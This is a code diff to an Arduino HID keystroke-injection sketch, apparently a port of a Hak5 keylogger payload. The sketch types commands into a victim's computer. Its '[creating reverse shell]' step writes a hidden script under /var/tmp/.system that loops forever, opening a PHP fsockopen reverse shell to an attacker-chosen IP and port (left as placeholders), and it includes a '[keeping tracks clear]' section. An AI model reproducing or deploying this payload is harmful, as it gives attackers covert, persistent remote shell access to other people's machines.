@@ -1,3 +1,8 @@
+// Arduino implementation of Hak5 Duckylogger with reverse shell
+// check hak5_rubber_ducky.txt for original hak5 file.
+// duckylogger script originally by Hak5, arduino translation done by z5410231
+
+
 #include <HID-Project.h>
 #include <HID-Settings.h>
 
@@ -14,9 +19,7 @@ void setup()
   AbsoluteMouse.begin();
   Keyboard.begin();
 
-  // Start Payload
   // [keeping tracks clear]
-
   delay(500);
 
   Keyboard.press(KEY_LEFT_CTRL);
@@ -74,7 +77,7 @@ void setup()
 
   // [creating reverse shell]
 
-  Keyboard.print("echo -e \"while :\\ndo\\n\\tping -c 5 0.0.0.0\\n\\tif [ $? -eq 0 ]; then\\n\\t\\tphp -r '\\$sock=fsockopen(\\\"0.0.0.0\\\",4444);exec(\"\\\"/var/tmp/.system/sys -i \"<&3 >&3 2>&3\"\\\"\");'\\n\\tfi\\ndone\" >  /var/tmp/.system/systemBus");
+  Keyboard.print("echo -e \"while :\\ndo\\n\\tping -c 5 0.0.0.0\\n\\tif [ $? -eq 0 ]; then\\n\\t\\tphp -r '\\$sock=fsockopen(\\\"listening_ip_goes_here\\\",listening_port_goes_here);exec(\"\\\"/var/tmp/.system/sys -i \"<&3 >&3 2>&3\"\\\"\");'\\n\\tfi\\ndone\" >  /var/tmp/.system/systemBus");
 
   typeKey(KEY_ENTER);
 
